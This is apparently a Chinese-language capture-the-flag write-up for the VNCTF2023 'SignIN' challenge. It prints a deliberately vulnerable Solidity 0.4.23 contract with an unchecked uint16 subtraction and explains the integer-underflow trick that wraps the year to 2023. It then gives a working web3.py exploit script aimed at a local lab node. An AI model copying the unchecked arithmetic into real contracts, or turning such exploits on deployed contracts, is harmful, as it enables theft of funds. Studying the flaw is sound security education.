# SignIN

## 源码

```js
pragma solidity ^0.4.23;

contract Checkin {
    string public welcomeMessage;
    uint16 public year;

    constructor(string _mssg) {
        welcomeMessage = _mssg;
        year = 2022;
    }

    function setMsg(string _welcomeMessage, uint16 _newyear) public {
        welcomeMessage = _welcomeMessage;
        year = year - _newyear;
    }

    function uintToStr(uint256 _i)
        internal
        pure
        returns (string memory _uintAsString)
    {
        uint256 number = _i;
        if (number == 0) {
            return "0";
        }
        uint256 j = number;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len - 1;
        while (number != 0) {
            bstr[k--] = bytes1(uint8(48 + (number % 10)));
            number /= 10;
        }
        return string(bstr);
    }

    function strConcat(string _a, string _b) internal returns (string) {
        bytes memory _ba = bytes(_a);
        bytes memory _bb = bytes(_b);
        string memory ret = new string(_ba.length + _bb.length);
        bytes memory bret = bytes(ret);
        uint256 k = 0;
        for (uint256 i = 0; i < _ba.length; i++) bret[k++] = _ba[i];
        for (i = 0; i < _bb.length; i++) bret[k++] = _bb[i];
        return string(ret);
    }

    function isSolved() public view returns (bool) {
        var msg = strConcat(welcomeMessage, uintToStr(year));
        return (keccak256(abi.encodePacked("Welcome to VNCTF2023")) ==
            keccak256(abi.encodePacked(msg)));
    }
}
```

## 题解

注意到pragma solidity ^0.4.23，猜测有整数溢出的漏洞，果不其然

需要输入string _welcomeMessage, uint16 _newyear，使得转换拼接后和"Welcome to VNCTF2023"相等

但是year初始值为2022，需要利用整数下溢，减uint16的最大值65535相当于加1。

因为2022-2022-1会变成65535，再减(65535-2023=63512)变成2023，也就是总共减了(2022+1+63512=65535)

web3py脚本

```python
from web3 import Web3, HTTPProvider
import requests
import time
import json


web3 = Web3(HTTPProvider('http://192.168.21.128:8545/'))
print(web3.isConnected())

private_key = "xxx"
account = web3.eth.account.from_key(private_key)
print(account.address)

assert(requests.post("http://192.168.21.128:8080/api/claim", data={"address": account.address}).status_code == 200)
time.sleep(10)

gas_price=5
gas_limit=500000
chal_address = web3.toChecksumAddress("0xa736DAE9fbf0452A4fEC60B9e07DD2Ab1C9DB2E7")
with open('exp.abi', 'r') as f:
    abi = json.load(f)
cha_contract = web3.eth.contract(address=chal_address, abi=abi)

tx = cha_contract.functions.setMsg("Welcome to VNCTF", 65535).build_transaction({
    "from": account.address,
    "value": web3.toWei(0, 'ether'),
    'gasPrice': web3.toWei(gas_price, 'gwei'),
    "gas": gas_limit,
    "nonce": web3.eth.getTransactionCount(account.address),
})

signed_tx = account.signTransaction(tx)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction).hex()
print(tx_hash)

receipt = web3.eth.waitForTransactionReceipt(tx_hash)
print(receipt)

res = cha_contract.functions.welcomeMessage().call()
print(res)
res = cha_contract.functions.year().call()
print(res)
res = cha_contract.functions.isSolved().call()
print(res)
```

